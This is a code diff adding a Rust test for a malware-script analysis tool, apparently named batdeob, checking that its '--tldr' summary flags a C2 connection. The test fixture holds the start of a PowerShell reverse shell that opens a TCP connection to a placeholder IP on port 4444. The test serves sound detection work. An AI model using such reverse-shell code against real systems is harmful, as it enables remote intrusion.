@@ -587,6 +587,42 @@ fn summarize_emits_compact_report() {
 }
 
 #[test]
+fn summarize_tldr_emits_human_readable_ioc_lines() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("rev.ps1");
+    fs::write(
+        &input,
+        r#"#powershell
+$ipaddress = '203.0.113.45'
+$dport = 4444
+$client = New-Object System.Net.Sockets.TcpClient($ipaddress, $dport)
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["summarize", "--tldr", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let s = String::from_utf8_lossy(&out.stdout);
+    assert!(
+        s.contains("C2 connect") && s.contains("203.0.113.45:4444"),
+        "tldr missing C2 connect: {s}"
+    );
+    assert!(
+        serde_json::from_str::<serde_json::Value>(&s).is_err(),
+        "tldr should be human-readable text, not JSON: {s}"
+    );
+}
+
+#[test]
 fn summarize_can_enrich_lolbas_matches_from_external_json() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
